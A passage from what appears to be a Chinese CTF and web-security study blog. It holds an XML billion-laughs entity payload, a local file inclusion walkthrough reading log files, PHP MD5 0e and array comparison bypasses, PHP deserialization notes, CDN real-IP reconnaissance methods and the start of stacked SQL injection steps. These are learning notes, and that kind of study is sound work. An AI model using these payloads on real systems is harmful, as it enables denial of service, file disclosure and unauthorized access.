class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;&quot;&gt;</span><br><span class="hljs-params">&lt;!ENTITY lol8 &quot;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;&quot;&gt;</span><br><span class="hljs-params">&lt;!ENTITY lol9 &quot;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;&quot;&gt;</span><br>]&gt;<br><span class="hljs-params">&lt;lolz&gt;</span><span class="hljs-variable">&amp;lol9</span><span class="hljs-punctuation">;</span><span class="hljs-params">&lt;/lolz&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2023/12/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2023/12/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>常规看源码或者检查网络可以看到一些小提示，比如某个奇怪的文件(●’◡’●)，这时候就可以尝试我们的文件包含</p><p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20231205211154100.png" alt="image-20231205211154100"></p><p>就像这样，访问该文件，如果发现有<strong>include</strong>函数，实锤</p><h3 id="warm-up-wp："><a href="#warm-up-wp：" class="headerlink" title="warm up wp："></a><strong>warm up</strong> wp：</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gradle">可以看到<span class="hljs-keyword">include</span>函数没有任何过滤措施，那么我们可以利用本地文件包含漏洞来访问任意文件，以获取flag，但是想要执行<span class="hljs-keyword">include</span>函数，我们需要满足三个条件：<br><br><span class="hljs-number">1</span>. <span class="hljs-keyword">file</span>不为空<br><span class="hljs-number">2</span>. <span class="hljs-keyword">file</span>的值是字符串<br><span class="hljs-number">3</span>. <span class="hljs-keyword">file</span>通过emmm类的checkFile方法校验<br>步骤一：因为我们定义了<span class="hljs-keyword">file</span>的值且是string类型，所以第一个<span class="hljs-keyword">if</span> 的<span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span> 顺利绕过<br>步骤二：因为我们的<span class="hljs-keyword">file</span>的值既不是<span class="hljs-keyword">source</span>.php也不是hint.php，所以是无法通过该<span class="hljs-keyword">if</span>的，直接放弃这个<span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>的机会，继续往下看。<br>步骤三：mb_substr会将<span class="hljs-keyword">file</span>的值通过一定的规则截取后，再次放入<span class="hljs-keyword">if</span>判断，那么我们可以在<span class="hljs-keyword">file</span>的值前面主动拼接一个<span class="hljs-keyword">source</span>.php?或者hint.php?，也就是<span class="hljs-keyword">file</span>=<span class="hljs-keyword">source</span>.php?../ffffllllaaaagggg，通过mb_substr截取后的值是<span class="hljs-keyword">source</span>.php，此时checkFile返回<span class="hljs-keyword">true</span><br></code></pre></td></tr></table></figure><p>附上source.php源码截图</p><p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20231205214739670.png" alt="image-20231205214739670"></p><p>文件包含在 php 中，涉及到的危险函数有四个，分别是</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">include</span>()、<span class="hljs-built_in">include_once</span>()、<span class="hljs-built_in">require</span>()、<span class="hljs-built_in">require_once</span>()。<br></code></pre></td></tr></table></figure><p>区别如下：</p><p><strong>include</strong>：包含并运行指定的文件，包含文件发生错误时，程序警告，但会继续执行。<br><strong>include_once</strong>：和 include 类似，不同处在于 include_once 会检查这个文件是否已经被导入，如果已导入，下文便不会再导入，直面 once 理解就是只导入一次。<br><strong>require</strong>：包含并运行指定的文件，包含文件发生错误时，程序直接终止执行。<br><strong>require_once</strong>：和 require 类似，不同处在于 require_once 只导入一次。<br>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为<strong>php</strong>文件进行解析。<br>因为文件路径可控，当输入系统的密码文件所在路径时，内容会输出出来</p><h4 id="查看日志文件"><a href="#查看日志文件" class="headerlink" title="查看日志文件"></a>查看日志文件</h4><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">?<span class="hljs-keyword">file</span>=/var/<span class="hljs-built_in">log</span>/nginx/<span class="hljs-keyword">access</span>.<span class="hljs-built_in">log</span> ：包含ngnix的日志记录<br></code></pre></td></tr></table></figure><p>从日志文件可以直接得到我们需要的路径(❁´◡&#96;❁)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化</title>
    <link href="/2023/12/23/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/12/23/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="magic函数"><a href="#magic函数" class="headerlink" title="magic函数"></a>magic函数</h2><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>__construct</td><td>当一个对象创建时被调用</td></tr><tr><td>__destruct</td><td>当一个对象销毁时被调用</td></tr><tr><td>__toString</td><td>当一个对象被当做字符串使用</td></tr><tr><td>__sleep</td><td>在对象被序列化之前运行</td></tr><tr><td>__wakeup</td><td>在对象被反序列化之后被调用</td></tr><tr><td>__serialize()</td><td>对对象调用serialize方法</td></tr><tr><td>__unserialize()</td><td>对对象调用unserialize方法</td></tr><tr><td>__call()</td><td>在对象上下文中调用不可访问的方法时触发</td></tr><tr><td>__callStatic()</td><td>在静态上下文中调用不可访问的方法时触发</td></tr><tr><td>__get()</td><td>用于从不可访问的属性读取数据</td></tr><tr><td>__set()</td><td>用于将数据写入不可访问的属性</td></tr><tr><td>__isset()</td><td>在不可访问的属性上调用isset()或empty()触发</td></tr><tr><td>__unset()</td><td>在不可访问的属性上使用unset()时触发</td></tr><tr><td>__invoke()</td><td>当脚本尝试将对象调用为函数时触发</td></tr></tbody></table><h2 id="反序列化特点"><a href="#反序列化特点" class="headerlink" title="反序列化特点"></a>反序列化特点</h2><p>1.在反序列化时可以对序列化的变量进行任意修改</p><p>2.如果传递的字符串不可以序列化，则返回FALSE</p><p>3.如果对象没有预定义，反序列化得到的对象是_PHP_Incomplete_Class</p><p>4.当同时定义了wakeup()方法和unserilize()方法时，wakeup方法将不会起效，只有unserilize方法会起作用</p><h2 id="反序列化作用"><a href="#反序列化作用" class="headerlink" title="反序列化作用"></a>反序列化作用</h2><p>1.传输对象</p><p>2.用作缓存(cookie,session)</p><h2 id="反序列化可用时机"><a href="#反序列化可用时机" class="headerlink" title="反序列化可用时机"></a>反序列化可用时机</h2><p>1.unserialize函数的参数可控，比如通过GET请求传参(漏洞触发点)</p><p>2.脚本中定义有Magic方法,里有向PHP文件中写数据或者执行命令的的操作,如_destruct(),unlink()</p><p>3.读写的内容需要有对象中成员变量的值，比如filename</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Md5类题目</title>
    <link href="/2023/12/23/md5/"/>
    <url>/2023/12/23/md5/</url>
    
    <content type="html"><![CDATA[<h1 id="MD5相关内容"><a href="#MD5相关内容" class="headerlink" title="MD5相关内容"></a>MD5相关内容</h1><h2 id="科学计数法（0e绕过）"><a href="#科学计数法（0e绕过）" class="headerlink" title="科学计数法（0e绕过）"></a>科学计数法（0e绕过）</h2><p>md5() 遇到「公式」，会先「运算」，再对运算结果「计算」MD5。</p><p>由于0和任何数相乘都等于0，所以0e开头的任何数，其MD5都是相同的。</p><p>比如 md5(‘0e1234’)，会先运算成 md5(0)，再计算MD5值。</p><p>补充：</p><p>0e是科学计数法，大小写等价，即 0e 和 0E 的结果相同。<br>科学记数法是一种记数的方法。把一个数表示成a与10的n次幂相乘的形式。<br>格式为：a e b&#x3D;a×10^b，即a乘以10的b次幂。</p><p>代码示例:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">echo <span class="hljs-built_in">md5</span>(<span class="hljs-number">0</span>)<span class="hljs-selector-class">.PHP_EOL</span>;<br>echo <span class="hljs-built_in">md5</span>(<span class="hljs-number">0</span>e123)<span class="hljs-selector-class">.PHP_EOL</span>;<br>echo <span class="hljs-built_in">md5</span>(<span class="hljs-number">0</span>e456)<span class="hljs-selector-class">.PHP_EOL</span>;<br>echo <span class="hljs-built_in">md5</span>(<span class="hljs-number">0</span>E456);<br></code></pre></td></tr></table></figure><p>输出为:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">cfcd208495d565ef66e7dff9f98764da</span><br>cfcd208495d565ef66e7dff9f98764da<br>cfcd208495d565ef66e7dff9f98764da<br>cfcd208495d565ef66e7dff9f98764da<br></code></pre></td></tr></table></figure><p>可见不同的式子在加上0e前缀之后,编写出来的md5值都相等,且可以看见0e不区分大小写</p><h3 id="可用绕过思路"><a href="#可用绕过思路" class="headerlink" title="可用绕过思路"></a>可用绕过思路</h3><h4 id="1-遇到弱比较（-md5-a-md5-b-）时，可以使用-0e绕过。"><a href="#1-遇到弱比较（-md5-a-md5-b-）时，可以使用-0e绕过。" class="headerlink" title="1.遇到弱比较（ md5(a)&#x3D;&#x3D;md5(b) ）时，可以使用 0e绕过。"></a>1.<strong>遇到弱比较（ md5(a)&#x3D;&#x3D;md5(b) ）时，可以使用 0e绕过。</strong></h4><p>实例：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">var_dump(md5(<span class="hljs-number">0</span>e123) <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span> md5(<span class="hljs-number">0</span>e456))<span class="hljs-comment">;</span><br>var_dump(md5(<span class="hljs-number">0</span>e123) <span class="hljs-operator">=</span><span class="hljs-operator">=</span> md5(<span class="hljs-number">0</span>e456))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">bool</span>(<span class="hljs-variable"><span class="hljs-literal">true</span></span>)</span><br><span class="hljs-function"><span class="hljs-title">bool</span>(<span class="hljs-variable"><span class="hljs-literal">true</span></span>)</span><br></code></pre></td></tr></table></figure><p>0e绕过还有一种变体：如果某个字符串的MD5值是0e开头的，在比较时，PHP也会先把它计算成 0，再参与比较。</p><h4 id="2-遇到比较（-md5-a-0-），可以传入特殊字符绕过。"><a href="#2-遇到比较（-md5-a-0-），可以传入特殊字符绕过。" class="headerlink" title="2.遇到比较（ md5(a)&#x3D;&#x3D;0 ），可以传入特殊字符绕过。"></a>2.遇到比较（ md5(a)&#x3D;&#x3D;0 ），可以传入特殊字符绕过。</h4><p> 实例：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">echo</span> <span class="hljs-function"><span class="hljs-title">md5</span>(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>).PHP_EOL;</span><br><span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">md5</span>(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>) == <span class="hljs-number">0</span>);</span><br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-number">0</span><span class="hljs-variable">e830400451993494058024219903391</span><br><span class="hljs-function"><span class="hljs-title">bool</span>(<span class="hljs-variable"><span class="hljs-literal">true</span></span>)</span><br></code></pre></td></tr></table></figure><p>一些MD5值为0e开头的字符串：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">QNKCDZO</span>   =&gt; <span class="hljs-number">0</span>e830400451993494058024219903391<br><span class="hljs-attr">240610708</span> =&gt; <span class="hljs-number">0</span>e462097431906509019562988736854<br><span class="hljs-attr">s878926199a</span> =&gt; <span class="hljs-number">0</span>e545993274517709034328855841020<br><span class="hljs-attr">s155964671a</span> =&gt; <span class="hljs-number">0</span>e342768416822451524974117254469<br><span class="hljs-attr">s214587387a</span> =&gt; <span class="hljs-number">0</span>e848240448830537924465865611904<br><span class="hljs-attr">s214587387a</span> =&gt; <span class="hljs-number">0</span>e848240448830537924465865611904<br></code></pre></td></tr></table></figure><h2 id="数组类型"><a href="#数组类型" class="headerlink" title="数组类型"></a>数组类型</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">md5</span><span class="hljs-params">()</span></span>不能处理数组,数组都会报回一个警告信息,不用管<br></code></pre></td></tr></table></figure><h3 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h3><h4 id="1-遇到强比较-a-b-时"><a href="#1-遇到强比较-a-b-时" class="headerlink" title="1.遇到强比较(a&#x3D;&#x3D;&#x3D;b)时"></a>1.遇到强比较(a&#x3D;&#x3D;&#x3D;b)时</h4><p>当遇到这种三个等号的强比较类型题目时,可以使用数组类进行绕过</p><p>GET传参时可以使用类似</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-selector-tag">b</span><span class="hljs-selector-attr">[]</span>=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>进行绕过</p><h2 id="算数运算配合自动类型转换"><a href="#算数运算配合自动类型转换" class="headerlink" title="算数运算配合自动类型转换"></a>算数运算配合自动类型转换</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">md5</span><span class="hljs-params">()</span></span> 遇到运算符，会先运算，再计算结果的MD5值。<br></code></pre></td></tr></table></figure><p>当字符串与数字类型运算时，会将字符串转换成数字类型，再参与运算，最后计算运算结果的MD5值。</p><h2 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h2><p>虽然 md5() 要求传入字符串，但传入整数或小数也不会报错；数字相同时，数值型和字符串的计算结果是相同的。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ssti模版注入</title>
    <link href="/2023/12/23/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/12/23/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>YL渗透日记</title>
    <link href="/2023/12/16/YL%E6%B8%97%E9%80%8F%E6%97%A5%E8%AE%B0/"/>
    <url>/2023/12/16/YL%E6%B8%97%E9%80%8F%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="浏览器查找"><a href="#浏览器查找" class="headerlink" title="浏览器查找"></a>浏览器查找</h2><table><thead><tr><th align="center">关键字</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">Site</td><td align="center">指定域名</td></tr><tr><td align="center">Inurl</td><td align="center">url中存在指定关键字的网页</td></tr><tr><td align="center">Intext</td><td align="center">网页正文中的关键字</td></tr><tr><td align="center">Filetype</td><td align="center">指定文件的类型</td></tr><tr><td align="center">Intitle</td><td align="center">网页标题中的关键字</td></tr><tr><td align="center">link</td><td align="center">返回所有与后面跟的url有链接的url</td></tr><tr><td align="center">Info</td><td align="center">查找指定站点的一些基本信息</td></tr><tr><td align="center">cache</td><td align="center">搜索谷歌里关于一些内容的缓存</td></tr></tbody></table><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>在对端口进行扫描之后，我们可以知道该服务器上提供的服务以及可能存在的便于我们攻击的点，但是得先掌握一些常用端口的常提供的服务以及可能存在的攻击位置<img src="C:\Users\Lenovo\Pictures\Screenshots\QQ截图20231127153547.png"></p><p><img src="C:\Users\Lenovo\Pictures\Screenshots\QQ截图20231127153604.png"></p><p><img src="C:\Users\Lenovo\Pictures\Screenshots\QQ截图20231127153616.png"></p><p><img src="C:\Users\Lenovo\Pictures\Screenshots\QQ截图20231127153625.png"></p><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p>利用网站的cms我们可以查验是否存在一些常见漏洞，常见工具可以使用kali自带的whatweb工具</p><p>使用方法为whatweb url 也可以加上-v来显示详细信息</p><p>具体内容移步至</p><p>渗透测试信息收集-CMS指纹识别 - h4m5t的文章 - 知乎<br><a href="https://zhuanlan.zhihu.com/p/355150689">https://zhuanlan.zhihu.com/p/355150689</a></p><h2 id="查找真实ip"><a href="#查找真实ip" class="headerlink" title="查找真实ip"></a>查找真实ip</h2><h3 id="ip地址划分"><a href="#ip地址划分" class="headerlink" title="ip地址划分"></a>ip地址划分</h3><p>&lt;一个域名只能对应一个ip,但是一个ip可以对应多个域名&gt;</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dns">公网地址<br>​ <span class="hljs-keyword">A</span>类：<span class="hljs-number">1.0.0.0</span> - <span class="hljs-number">126.0.0.0</span> <span class="hljs-number">255.0.0.0</span><br>​ B类：<span class="hljs-number">128.0.0.0</span> - <span class="hljs-number">191.255.255.0</span> <span class="hljs-number">255.255.0.0</span><br>​ C类：<span class="hljs-number">192.0.0.0</span> - <span class="hljs-number">223.255.255.0</span> <span class="hljs-number">255.255.255.0</span><br>​ D类：<span class="hljs-number">224.0.0.0</span> - <span class="hljs-number">239.255.255.255</span> （多播地址）<br>​ E类：<span class="hljs-number">240.0.0.0</span> - <span class="hljs-number">247.255.255.255</span> （保留地址）<br><br>私有地址<br>​ <span class="hljs-number">10.0.0.0</span> - <span class="hljs-number">10.255.255.255</span><br>​ <span class="hljs-number">172.16.0.0</span> - <span class="hljs-number">172.31.255.255</span><br>​ <span class="hljs-number">192.168.0.0</span> - <span class="hljs-number">192.168.255.255</span><br></code></pre></td></tr></table></figure><h3 id="CDN基础介绍"><a href="#CDN基础介绍" class="headerlink" title="CDN基础介绍"></a>CDN基础介绍</h3><p><strong>CDN：Content Delivery Network 内容分发网络</strong></p><p>CDN可以理解为一种虚拟网络,将很多静态资源放在节点服务器上,以减少web服务器的负担,通常访问较大网站都会直接从CDN上给我们发放资源,用户可以直接通过就近的节点服务器访问这部分资源，而不用通过web服务器，当用户有实际数据进行交互的时候才会访问Web服务器，因此CDN可以降低网络拥塞，提高响应速度。</p><p><strong>简单理解就是CDN能够让用户访问就近的节点服务器</strong></p><p>所以有可能我们查询到的ip其实是该网站CDN的ip地址</p><h4 id="判断是否存在CDN"><a href="#判断是否存在CDN" class="headerlink" title="判断是否存在CDN"></a>判断是否存在CDN</h4><p>从不同省份ping同一个域名，查看响应的ip地址是否相同，不同的话就说明存在CDN且多个CDN在同时工作</p><h4 id="绕过CDN"><a href="#绕过CDN" class="headerlink" title="绕过CDN"></a>绕过CDN</h4><h5 id="以下为查询资料得到的几种常见方式"><a href="#以下为查询资料得到的几种常见方式" class="headerlink" title="以下为查询资料得到的几种常见方式"></a>以下为查询资料得到的几种常见方式</h5><p>1.使用phpinfo()，可以查看本地的ip地址以及使用端口</p><p>2.或者使用一点神奇的小玩意，比如这个网站 https:&#x2F;&#x2F;<a href="https://so.csdn.net/so/search?q=asm&spm=1001.2101.3001.7020">asm</a>.ca.com&#x2F;en&#x2F;ping.php，可以从国外来ping我们需要查询的url，这样就避免了国内CDN的误导</p><p>3.ping顶级域名<br>也可以在线网站ping顶级域名，若得到多个IP，在fofa上逐一输入IP进行验证（或用view-source的方式）</p><p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20231213110027197.png" alt="image-20231213110027197"></p><p>发现ping baidu.com，返回的第一条信息是 Ping baidu.com …</p><p>ping <a href="http://www.baidu.com/">www.baidu.com</a> 返回的第一条信息是 Ping <a href="http://www.a.shifen.com/">www.a.shifen.com</a> 和用户输入的域名不同。<a href="http://www.a.shifen.com/">www.a.shifen.com</a> 是CDN的地址 </p><p>4.一般的邮件系统都在内部，没有经过CDN的解析，<strong>通过目标网站用户注册或者RSS订阅功能，查看邮件，寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名</strong>，就可以获得目标的真实IP(必须是目标自己的邮件服务器，第三方或者公共邮件服务器是没有用的)</p><p>5.查看子域名</p><p>  往往流量少的子域名不会使用CDN，用户直接访问，就能得到真实的IP地址</p><p>案例一</p><p><a href="http://www.taobao.com/">www.taobao.com</a> 是淘宝网的主页</p><p>talent.alibaba.com 是阿里巴巴网上招聘的主页</p><p>nslookup 解析 talent.alibaba.com</p><p>经过view-source验证，结果 招聘主页解析的IP地址 就是 淘宝网的真实IP地址</p><p><img src="https://img-blog.csdnimg.cn/2021071717560838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjY4NDU3OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>案例二</p><p>有时候没办法直接用IP地址访问网页，但是可以用fofa的方式</p><p><img src="https://img-blog.csdnimg.cn/20210717180103170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjY4NDU3OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>若一个子域名找不到，尝试多个子域名，根据IP地址的分类（A,B,C类等）确定域名对应的IP</p><p>例如查看京东的 help.jd.com jr.jd.com等，ping这些url的时候，返回的都是cnd，因此可以排除</p><p>jd.com gift.jd.com authcode.jd.com 等子域名 用全球ping网站进行测试，找共用的IP</p><p>如果有共用的IP，然后将得到的IP 在fofa上查询，能够找到对应的子域名，证明这些IP时真实的，不是CDN</p><p>6.查询资料得</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//crt.sh 此网站通过域名查找对应的SSL证书的 HASH值（SHA-256）</span><br><br>Censys：https:<span class="hljs-comment">//search.censys.io/certificates?q= 此网站通过Hash(SHA-256)得到真实IP</span><br></code></pre></td></tr></table></figure><p>但是根据gpt查找原理又称其不成立,理由如下:</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">通过Hash(SHA<span class="hljs-string">-256</span>)得到真实IP的原理是不可能的。SHA<span class="hljs-string">-256</span>是一种单向哈希函数，它将输入数据转换为固定长度的哈希值，具有以下特性：<br>不可逆性：对于给定的哈希值，几乎不可能从哈希值反推出原始输入数据。<br>唯一性：不同的输入数据通常会产生不同的哈希值，但相同的输入数据将始终产生相同的哈希值。<br>因此，通过SHA<span class="hljs-string">-256</span>哈希函数无法直接获取到原始数据（例如真实IP地址）。哈希函数常用于数据完整性验证、密码存储等场景，但不能用于反向推导出原始数据。<br></code></pre></td></tr></table></figure><p>7.域名解析:</p><p>使用命令:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nslookup</span><br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">第一部分：<br>解析baidu.<span class="hljs-keyword">com</span> 的 服务器url 和 IP地址<br>第二张图中的address：<span class="hljs-number">192.168</span>.<span class="hljs-number">54.38</span> 是本地局域网的网关<br><br>第二部分—非权威应答：<br>第一次请求的DNS服务器没有 baidu.<span class="hljs-keyword">com</span> 对应的IP地址，无法解析。此DNS服务器会通过迭代递归的方式从百度公司实际存储此记录信息的DNS server中获取baidu.<span class="hljs-keyword">com</span>的IP，然后返回给用户，同时客户端会把baidu.<span class="hljs-keyword">com</span>的信息放在本地记录一段时间。<br>当用户再次解析baidu.<span class="hljs-keyword">com</span>的时候，会直接从本地缓存中解析并返回，这个过程叫非权威应答。<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210717175627590.png#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210717175722580.png#pic_center" alt="在这里插入图片描述"></p><p>8.还有一个反向查询ip网站来解析域名：<a href="http://www.viewdns.com/">www.viewdns.com</a></p><p>9.网站漏洞</p><p>利用网站自身存在的漏洞，很多情况下会泄露服务器的真实IP地址（仅适用于傻狗网站）</p><h4 id="验证是否查找到真实ip"><a href="#验证是否查找到真实ip" class="headerlink" title="验证是否查找到真实ip"></a>验证是否查找到真实ip</h4><h5 id="1-view-source验证"><a href="#1-view-source验证" class="headerlink" title="1.view-source验证"></a>1.view-source验证</h5><p>在浏览器中地址栏输入view-source加我们需要验证的ip地址，如果出现了正确的图标，整证明找到的IP 地址是真实的</p><h5 id="2-fofa验证"><a href="#2-fofa验证" class="headerlink" title="2.fofa验证"></a>2.fofa验证</h5><p>输入最有可能是真实的IP地址，查看网页正文信息，或者直接输入IP，看fofa上是否显示对应的域名</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>首先ping顶级域名，将返回的IP地址进行验证</li><li>尝试国外ping，看域名解析返回的信息</li><li>查找子域名IP（淘宝和阿里招聘是同一个IP），结合看解析返回的信息</li><li>历史域名解析</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>web渗透部分复现</title>
    <link href="/2023/12/16/web%E6%B8%97%E9%80%8F%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/12/16/web%E6%B8%97%E9%80%8F%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="web基础思路总结"><a href="#web基础思路总结" class="headerlink" title="web基础思路总结"></a>web基础思路总结</h2><p>一个菜鸟的简单渗透日记</p><h3 id="常见SQL思路"><a href="#常见SQL思路" class="headerlink" title="常见SQL思路"></a>常见SQL思路</h3><h4 id="1-堆叠注入"><a href="#1-堆叠注入" class="headerlink" title="1.堆叠注入"></a>1.堆叠注入</h4><p>  遇到题目就只给单独一个输入框然后进行查询的，直接考虑堆叠注入，一套不解释连招秒了╰(<em>°▽°</em>)╯</p><p>  堆叠注入</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">第一步:常规判断闭合&lt;只要给界面搞报错就是成功了&gt;</span><br><span class="hljs-section">第二步:构造语句查询库名和表名,以单引号闭合题目为例&lt;1&#x27;;show databases;#&gt;注意这里database后面要加s</span><br><span class="hljs-section">第三步:当我们找到表名之后要尝试将其打开,这是要使用函数handler</span><br><span class="hljs-section">补充handler用法:</span><br>HANDLER tbl_name OPEN; 打开一张表<br>HANDLER tbl_name READ FIRST/NEXT; 